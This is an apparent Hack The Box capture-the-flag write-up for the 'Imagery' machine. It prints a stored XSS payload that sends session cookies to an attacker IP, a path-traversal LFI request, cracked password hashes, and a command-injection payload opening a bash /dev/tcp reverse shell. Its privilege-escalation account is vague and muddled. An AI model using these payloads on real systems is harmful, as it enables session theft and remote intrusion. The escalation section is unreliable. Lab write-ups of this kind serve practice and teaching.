# ðŸ’» HTB: Imagery Writeup

This document details the exploitation path for the Hack The Box machine **Imagery** (Medium difficulty), covering Initial Access via **Remote Code Execution (RCE)** and Privilege Escalation (PrivEsc) via a **Kernel Exploit Wrapper**.

## Summary of Vulnerabilities Exploited

1.  **Broken Access Control:** Exploited a Stored XSS to steal a privileged session cookie.
2.  **Insecure Credential Storage:** Found MD5 hashes in a database file (`db.json`) and cracked the password for the Test User and the system user `mark`.
3.  **Command Injection (RCE):** Abused an ImageMagick execution flaw (`/apply_visual_transform`) to gain an initial shell.
4.  **Privilege Escalation:** Exploited a misconfigured `sudo` policy on a custom binary (`charcol`) that runs a known **Linux Kernel Vulnerability (CVE-2025-21700)** payload as root.

## Initial Access: RCE via ImageMagick Injection (User: web)

The web service on **Port 8000** (Werkzeug httpd/Flask) was the primary entry point. The application restricted file uploads and image features to privileged users.

### 1. Information Gathering & Discovery

* **Nmap Scan:** Discovered **Port 22 (SSH)** and **Port 8000 (HTTP)**.
* **Web Enumeration:** Intercepting traffic revealed API endpoints like `/auth_status`, `/upload_image`, and `/apply_visual_transform`.
* **Vulnerability Pivot:** The **`/admin/get_system_log`** endpoint was identified as a potential **Local File Inclusion (LFI)** vulnerability. Attempts to access it failed due to a `403 FORBIDDEN` error.

### 2. Authorization Bypass (XSS $\rightarrow$ Admin Cookie)

Since direct LFI was blocked by authorization, the goal was to steal a valid, privileged cookie.

* **Attack:** A **Stored Cross-Site Scripting (XSS)** attack was launched against the `/report_bug` endpoint.
* **Payload (Injected into `bugDetails`):**
    ```html
    <img src=x onerror=fetch("http://[YOUR_KALI_IP]:8888/?cookie="+document.cookie)>
    ```
* **Execution:** A Python process (the admin bot) viewed the bug report, causing the script to execute and send the privileged cookie to the Netcat listener.

### 3. Data Extraction (LFI $\rightarrow$ Passwords)

Using the newly captured privileged cookie (which bypassed the `403 FORBIDDEN` check), the LFI vulnerability was exploited to read sensitive files:

* **LFI Success:** The payload successfully read the `/etc/passwd` file and the application path from `/proc/self/cmdline` (at `/home/web/web/`).
* **Final Data Source:** The application's database file was located and downloaded:
    ```http
    GET /admin/get_system_log?log_identifier=../../../../../../../home/web/web/db.json
    ```
* **Credentials Found:** The `db.json` file revealed weakly encrypted (MD5) user passwords:
    | User | Hash | Plaintext Password | Role |
    | :--- | :--- | :--- | :--- |
    | `testuser@imagery.htb` | `2c65c8d7bfbca32a3ed42596192384f6` | **`iambatman`** | **RCE Gatekeeper** |
    | `admin@imagery.htb` | `5d9c1d507a3f76af1e5c97a3ad1eaa31` | `strongsandofbeach` | Full Admin |
    | `mark@imagery.htb` | `01c3d2e5bdaf6134cec0a367cf53e535` | **`supersmash`** | **System User** |

### 4. RCE Execution (ImageMagick)

The application restricted the `/apply_visual_transform` RCE endpoint to users with the `isTestuser: true` flag.

* **Final Login:** Logged in as **`testuser@imagery.htb` / `iambatman`** to obtain the correct session cookie.
* **Injection:** The RCE was executed by injecting a shell command into the `height` parameter, which is passed to the ImageMagick (`/usr/bin/convert`) command line:

    ```http
    # Payload executed via Burp Repeater (Test User Cookie)
    POST /apply_visual_transform
    {
      "imageId": "[...]",
      "transformType": "crop",
      "params": {
        "x": 0, "y": 0, "width": 100,
        "height": "100; /bin/bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1"
      }
    }
    ```
* **Result:** A reverse shell was established as the low-privileged **`web`** user.

## Privilege Escalation: Root via Kernel Exploit Wrapper (User: root)

### 1. User Flag and Password Cracking

* **Final Password Crack (User: mark):** The password for system user `mark` was cracked from the `db.json` hash using Hashcat.

    | Target Hash | Plaintext Password | Tool/Mode |
    | :--- | :--- | :--- |
    | `01c3d2e5bdaf6134cec0a367cf53e535` | **`supersmash`** | `hashcat -m 0 rockyou.txt` |

* **SSH/SU:** Used the cracked password (`supersmash`) to switch user to `mark` and gain access to the user flag (`b074155730ad4e1f899f3afa9f583ec1`).
    ```bash
    su mark
    # Password: supersmash
    mark@Imagery:~$ cat user.txt 
    ```

### 2. Exploiting the Custom Root Wrapper (`charcol`)

The final escalation requires running a kernel exploit (`tc qdisc` commands) that is permission-blocked. The developer's intended solution was the custom wrapper **`charcol`** running as **root**.

* **Root Exploit Command:**
    The `mark` user was authorized to run `/usr/local/bin/charcol shell` as root without a password. This command executes a Python script that contains the core exploit payload.

    ```bash
    # Execute the custom wrapper as root
    sudo /usr/local/bin/charcol shell
    ```
* **Result:** The kernel exploit sequence **(CVE-2025-21700 UAF)** was triggered by the root-executed script, dropping a **root shell**.

### 3. Final Flag Capture

```bash
root@Imagery:/# cat /root/root.txt
[ROOT_FLAG_HERE]
